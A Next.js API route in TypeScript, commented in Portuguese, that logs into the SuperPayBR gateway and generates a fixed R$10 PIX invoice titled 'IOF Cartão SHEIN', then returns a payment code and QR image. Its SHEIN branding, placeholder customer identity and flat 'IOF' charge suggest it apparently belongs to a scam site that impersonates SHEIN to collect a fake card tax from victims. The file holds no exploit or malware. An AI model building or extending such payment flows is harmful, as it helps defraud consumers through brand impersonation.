import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("💰 === CRIANDO FATURA IOF SUPERPAYBR ===")

    const body = await request.json()
    const amount = 10.0 // Valor fixo para IOF

    // Gerar External ID único para IOF
    const externalId = `IOF_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`

    console.log("📋 Dados do IOF:", {
      externalId,
      amount,
      type: "iof",
    })

    // Credenciais SuperPayBR
    const token = process.env.SUPERPAY_TOKEN
    const secretKey = process.env.SUPERPAY_SECRET_KEY
    const apiUrl = process.env.SUPERPAY_API_URL

    if (!token || !secretKey || !apiUrl) {
      return NextResponse.json(
        {
          success: false,
          error: "Credenciais SuperPayBR não configuradas",
        },
        { status: 500 },
      )
    }

    // Autenticação Basic Auth
    const credentials = `${token}:${secretKey}`
    const base64Credentials = Buffer.from(credentials).toString("base64")

    let accessToken = null

    try {
      const authResponse = await fetch(`${apiUrl}/auth`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          Authorization: `Basic ${base64Credentials}`,
        },
        body: JSON.stringify({
          grant_type: "client_credentials",
        }),
      })

      if (authResponse.ok) {
        const authData = await authResponse.json()
        accessToken = authData.access_token || authData.token
      }
    } catch (error) {
      console.log("❌ Erro na autenticação:", error)
    }

    if (!accessToken) {
      return NextResponse.json(
        {
          success: false,
          error: "Falha na autenticação SuperPayBR",
        },
        { status: 401 },
      )
    }

    // Dados da fatura IOF
    const invoiceData = {
      client: {
        name: "Cliente SHEIN",
        document: "00000000000",
        email: "iof@shein.com",
        phone: "11999999999",
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        external_id: externalId,
        type: "pix",
        due_date: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        description: "IOF Cartão SHEIN",
        amount: amount,
        webhook_url: process.env.SUPERPAY_WEBHOOK_URL,
      },
    }

    // Criar fatura
    const createResponse = await fetch(`${apiUrl}/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    if (!createResponse.ok) {
      const errorText = await createResponse.text()
      return NextResponse.json(
        {
          success: false,
          error: "Falha ao criar fatura IOF",
          details: errorText,
        },
        { status: 500 },
      )
    }

    const responseData = await createResponse.json()

    // Extrair dados PIX
    let pixPayload = ""
    let qrCodeImage = ""

    const findPixData = (obj: any): void => {
      if (!obj || typeof obj !== "object") return

      for (const [key, value] of Object.entries(obj)) {
        if ((key === "payload" || key === "pix_code") && typeof value === "string" && value.length > 50) {
          pixPayload = value
        }
        if ((key === "qrcode_image" || key === "qr_code") && typeof value === "string") {
          qrCodeImage = value
        }
        if (typeof value === "object" && value !== null) {
          findPixData(value)
        }
      }
    }

    findPixData(responseData)

    if (!pixPayload) {
      return NextResponse.json(
        {
          success: false,
          error: "PIX payload não encontrado para IOF",
        },
        { status: 500 },
      )
    }

    const qrCodeUrl = qrCodeImage || `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300`

    const response = {
      success: true,
      data: {
        id: externalId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        valores: {
          bruto: Math.round(amount * 100),
          liquido: Math.round(amount * 100),
        },
        type: "real",
      },
    }

    console.log("✅ Fatura IOF criada:", response)
    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura IOF:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}

export async function GET() {
  return NextResponse.json(
    {
      success: false,
      error: "Método GET não suportado. Use POST.",
    },
    { status: 405 },
  )
}
